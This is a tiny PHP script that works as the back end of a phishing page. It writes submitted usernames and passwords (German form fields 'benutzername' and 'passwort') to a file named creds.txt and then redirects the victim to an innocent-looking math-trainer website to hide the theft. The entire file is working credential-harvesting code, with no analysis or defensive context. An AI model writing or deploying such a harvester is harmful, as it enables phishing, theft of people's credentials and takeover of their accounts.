<?php
file_put_contents("creds.txt",
    "Benutzername: " . $_POST['benutzername'] . "\n" .
    "Passwort: " . $_POST['passwort'] . "\n\n",
    FILE_APPEND);

header('Location: https://plator-js.github.io/mathtrainer/');
exit();
?>
